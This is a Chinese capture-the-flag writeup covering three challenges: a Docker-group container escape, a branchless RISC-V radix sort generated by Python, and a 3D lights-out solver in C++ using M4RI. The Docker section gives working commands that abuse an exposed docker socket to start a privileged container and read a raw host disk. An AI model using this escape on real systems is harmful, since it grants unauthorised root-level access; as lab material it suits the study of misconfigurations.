# ZHR's Writeup

质量不高，所以只传了官方题解不太一样的。

## Docker for Everyone Plus

注意到 `/etc/group` 里有 `docker:x:103:`，而且 `/run/docker.sock` 是这个组的，运行的时候把 `/bin/docker` 和 `/run/docker.sock` 挂上并且把自己变成这个组就可以直接在 container 里无限制用 docker 了。

```text
$ sudo docker run --rm --security-opt\=no-new-privileges -u 1000\:1000 -it -u 1000\:103 -v /dev\:/dev -v /bin\:/bin -v /usr\:/usr -v /lib\:/lib -v /var\:/var -v /run\:/run <image>
$ docker run --privileged=true --rm -it -v /dev\:/dev <image>
# cat /dev/vdb
```

~~套娃好玩吗？~~

## RISC-V：虎胆龙威

### 线程故障

没看到 `bnez` 能用，所以被迫用 `jalr` 人工微调实现跳转。

用的是基数排序，这样实际上只有判断某一位是 1 或 0 需要分支，循环之类的全用代码生成了根本不用判断。

```assembly
.section .text
_start:
    la a0, 0xf80
    la a1, 0xfc0
# placeholder
    j _end
_save_if_0:
    srli t0, t0, 31
    slli t0, t0, 3  # only bit on 2^3
    jal t2, _jump_0 # t2 := PC of next line; must use label or it will be compiled into jumping to self, why?
_jump_0:
    add t0, t0, t2  # t2
    addi t0, t0, 12 # t2 + 4
    jr t0           # t2 + 8
    sw a2, 0(t1)    # t2 + 12 + 8 * 0; we will be here if 0
    addi t1, t1, 4
    jr x1           # t2 + 12 + 8 * 1; we will be here if 1
_save_if_1:
    srli t0, t0, 31
    slli t0, t0, 2  # only bit on 2^2
    jal t2, _jump_1 # t2 := PC of next line
_jump_1:
    add t0, t0, t2  # t2
    addi t0, t0, 12 # t2 + 4
    jr t0           # t2 + 8
    jr x1           # t2 + 12 + 4 * 0; we will be here if 0
    sw a2, 0(t1)    # t2 + 12 + 4 * 1; we will be here if 1
    addi t1, t1, 4
    jr x1
_end:
    j _end
```

```python
NUMS = 16
BITS = 32

s = ''

# Copy from src to dst
for i in range(NUMS):
    s += f'\tlw t0, {i*4}(a0)\n'
    s += f'\tsw t0, {i*4}(a1)\n'

# Sign bit is not needed
for bit in range(BITS - 1):
    s += f'\tli t3, {BITS-1-bit}\n'
    s += '\tjal x2, _sort_bit\n'

s += '_sort_bit:\n'
# copy from dst to src
for i in range(NUMS):
    s += f'\tlw t0, {i*4}(a1)\n'
    s += f'\tsw t0, {i*4}(a0)\n'
s += '\tmv t1, a1\n'
for c in [0, 1]:
    for i in range(NUMS):
        s += f'\tlw a2, {i*4}(a0)\n'
        s += f'\tsll t0, a2, t3\n'
        s += f'\tjal x1, _save_if_{c}\n'
s += '\tjr x2\n'

with open('main.S', 'w') as f:
    f.write(open('main.S.in').read().replace('# placeholder\n', s))
```

写 writeup 的时候才发现 `j _end` 没放在实际流程的末尾而是放到（伪）函数的末尾了，但是其实排好后目标地址的值就不会再变了，问题不大。

## 关灯

前面思路跟官方题解一样，但是最后解异或方程组可以直接用 [M4RI](https://github.com/malb/m4ri)，$N^2 \times N^2$ 的矩阵在我的笔记本的残血 R9-5900HS (8C16T) 上只需要两三秒，~~不需要线性代数知识而且总运行时间远短于官方题解~~。

```cpp
// common.hpp
#pragma once

#include <array>
#include <bitset>

constexpr int N = 3;
// constexpr int N = 5;
// constexpr int N = 11;
// constexpr int N = 149;

using grid_t = std::array<std::array<std::bitset<N>, N>, N>;

void push_other_layer(int x, grid_t &grid,
                      const std::array<std::bitset<N>, N> &lights) {
  if (x < 0 || x >= N)
    return;
  for (int i = 0; i < N; ++i)
    grid[x][i] ^= lights[i];
}

// Pass a copy as we will modify the grid
void push_layer(int x, grid_t &grid, std::array<std::bitset<N>, N> lights) {
  push_other_layer(x - 1, grid, lights);
  push_other_layer(x + 1, grid, lights);

  // Push this layer
  push_other_layer(x, grid, lights);
  for (int i = 0; i < N; ++i) {
    grid[x][i] ^= (lights[i] >> 1);
    grid[x][i] ^= (lights[i] << 1);
    if (i > 0)
      grid[x][i] ^= lights[i - 1];
    if (i + 1 < N)
      grid[x][i] ^= lights[i + 1];
  }
}

void change_if_valid(int x, int y, int z, grid_t &grid) {
  if (x >= 0 && x < N && y >= 0 && y < N && z >= 0 && z < N)
    grid[x][y][z].flip();
}

void push_single(int x, int y, int z, grid_t &grid) {
  change_if_valid(x, y, z, grid);
  change_if_valid(x + 1, y, z, grid);
  change_if_valid(x - 1, y, z, grid);
  change_if_valid(x, y + 1, z, grid);
  change_if_valid(x, y - 1, z, grid);
  change_if_valid(x, y, z + 1, grid);
  change_if_valid(x, y, z - 1, grid);
}
```

```cpp
// make-table.cpp
#include "common.hpp"

#include <climits>

#include <fstream>
#include <iostream>
#include <string>
#include <vector>

static_assert(sizeof(int) * CHAR_BIT >= 32);

std::vector<int> results[N][N];

int main() {
  // #pragma omp parallel for
  for (int i = 0; i < N; ++i) {
    for (int j = 0; j < N; ++j) {
      std::cerr << "Calculating (" << i << ", " << j << ")" << std::endl;
      grid_t grid;
      push_single(0, i, j, grid);
      for (int k = 1; k < N; ++k)
        push_layer(k, grid, grid[k - 1]);
      for (int x = 0; x < N; ++x) {
        for (int y = 0; y < N; ++y) {
          if (grid[N - 1][x][y])
            results[i][j].push_back(x * N + y);
        }
      }
    }
  }
  std::cerr << "Saving" << std::endl;
  std::ofstream of("table-" + std::to_string(N) + ".txt");
  for (int i = 0; i < N; ++i) {
    for (int j = 0; j < N; ++j) {
      of << results[i][j].size();
      for (const auto &item : results[i][j])
        of << ' ' << item;
      of << '\n';
    }
  }
  return 0;
}
```

```cpp
// solve.cpp
#include "common.hpp"

#include <climits>

#include <array>
#include <bitset>
#include <fstream>
#include <iostream>
#include <string>

#include <m4ri/m4ri.h>

static_assert(sizeof(int) * CHAR_BIT >= 32);

int main() {
  std::ios::sync_with_stdio(false);

  const auto mat = mzd_init(N * N, N * N);
  {
    std::ifstream table("table-" + std::to_string(N) + ".txt");
    for (int i = 0; i < N * N; ++i) {
      int count;
      table >> count;
      while (count--) {
        int p;
        table >> p;
        mzd_write_bit(mat, p, i, 1);
      }
    }
  }

  grid_t grid, control;
  {
    std::string s;
    std::cin >> s;
    if (s.length() != N * N * N) {
      std::cerr << "String length not match!" << std::endl;
      return 1;
    }
    for (int i = 0; i < N; ++i) {
      for (int j = 0; j < N; ++j) {
        for (int k = 0; k < N; ++k)
          grid[i][j][k] = (s[i * N * N + j * N + k] == '1');
      }
    }
  }
  // for (int i = 0; i < N; ++i) {
  //   for (int j = 0; j < N; ++j) {
  //     if ((i ^ j) & 1)
  //       push_single(0, i, j, grid);
  //   }
  // }
  for (int i = 1; i < N; ++i) {
    // Change control array before modifying grid!!!
    for (int j = 0; j < N; ++j)
      control[i][j] ^= grid[i - 1][j];
    push_layer(i, grid, grid[i - 1]);
  }
  const auto res = mzd_init(N * N, 1);
  for (int i = 0; i < N; ++i) {
    for (int j = 0; j < N; ++j)
      mzd_write_bit(res, i * N + j, 0, grid[N - 1][i][j]);
  }
  if (mzd_solve_left(mat, res, 0, 1) != 0) {
    std::cerr << "WTF? Inconsistent." << std::endl;
    return 1;
  }
  for (int i = 0; i < N; ++i) {
    for (int j = 0; j < N; ++j) {
      if (mzd_read_bit(res, i * N + j, 0)) {
        // std::cerr << i << ' ' << j << std::endl;
        control[0][i][j].flip();
        push_single(0, i, j, grid);
      }
    }
  }
  mzd_free(res);
  for (int i = 1; i < N; ++i) {
    for (int j = 0; j < N; ++j)
      control[i][j] ^= grid[i - 1][j];
    push_layer(i, grid, grid[i - 1]);
  }
  for (int i = 0; i < N; ++i) {
    for (int j = 0; j < N; ++j) {
      if (grid[i][j].any()) {
        std::cerr << "Why we still have 1? (" << i << ", " << j << ")"
                  << std::endl;
        return 1;
      }
    }
  }
  mzd_free(mat);
  for (int i = 0; i < N; ++i) {
    for (int j = 0; j < N; ++j) {
      for (int k = 0; k < N; ++k)
        std::cout.put(control[i][j][k] ? '1' : '0');
    }
  }
  return 0;
}
```
